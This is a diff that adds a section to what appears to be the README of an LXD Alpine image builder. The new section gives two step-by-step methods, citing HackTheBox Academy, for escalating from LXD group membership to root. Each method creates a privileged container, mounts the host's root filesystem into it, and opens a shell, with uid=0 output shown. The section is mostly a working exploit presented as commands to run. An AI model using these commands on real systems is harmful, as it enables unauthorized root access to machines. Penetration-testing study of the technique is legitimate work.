@@ -25,6 +25,69 @@ After the image is built it can be added as an image to LXD as follows:
     lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine-v3.3
 
 
+## LXD group privilege escalation
+Source (method-1): https://academy.hackthebox.com/module/51/section/477
+
+Source (method-2): https://academy.hackthebox.com/module/51/section/1588
+
+- Confirm the group
+`id`
+
+- Clone the repository
+```
+git clone https://github.com/ertaku12/lxd-alpine-builder.git
+
+cd lxd-alpine-builder
+```
+
+- Find the binary
+
+```
+find / -type f -name lxc 2>/dev/null
+
+find / -type f -name lxd 2>/dev/null
+```
+
+- Exploit method-1
+```bash
+lxd init
+
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
+
+lxc init alpine r00t -c security.privileged=true
+
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+
+lxc start r00t
+
+lxc exec r00t /bin/sh
+
+# id
+uid=0(root) gid=0(root)
+
+```
+
+- Exploit method-2
+```bash
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp
+
+lxc image list
+
+lxc init ubuntutemp privesc -c security.privileged=true
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+lxc start privesc
+
+lxc exec privesc /bin/bash
+
+# id
+uid=0(root) gid=0(root)
+
+```
+
+
+
 ## License
 
 This script uses the same license as the script it was derived from: LGPL 2.1
